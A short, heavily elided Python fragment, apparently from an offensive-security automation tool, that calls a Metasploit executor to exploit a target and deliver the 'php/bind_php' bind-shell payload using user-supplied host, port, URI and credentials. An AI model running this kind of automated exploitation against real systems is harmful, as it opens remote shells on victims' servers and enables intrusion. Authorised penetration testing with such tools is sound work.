...
async def main():
    ...
    with console.status("[bold green]Configuring Metasploit payload..."):
        ...
        metasploit_executor.exploit_and_execute_payload(
            ...
            payload_module_name="php/bind_php",
            RHOSTS=user_params["RHOSTS"], RPORT=user_params["RPORT"], TARGETURI=user_params["TARGETURI"], USERNAME=user_params["USERNAME"], PASSWORD=user_params["PASSWORD"], LPORT=user_params["LPORT"]
    )
